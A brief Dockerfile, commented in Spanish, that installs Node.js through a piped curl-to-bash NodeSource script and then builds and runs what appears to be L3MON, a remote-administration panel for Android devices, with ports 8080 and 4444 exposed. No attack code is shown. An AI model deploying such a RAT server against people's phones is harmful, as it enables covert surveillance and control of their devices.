FROM ubuntu:22.04

RUN apt-get update && \
    apt-get install -y curl && \
    curl -fsSL https://deb.nodesource.com/setup_22.x | bash - && \
    apt-get install -y nodejs && \
    apt-get clean

COPY l3mon /root/L3MON-2
WORKDIR /root/L3MON-2
RUN npm install

EXPOSE 8080 4444

# Copiar el script de inicio
COPY start.sh /start.sh
RUN chmod +x /start.sh

# Usar el script como CMD
CMD ["/start.sh"]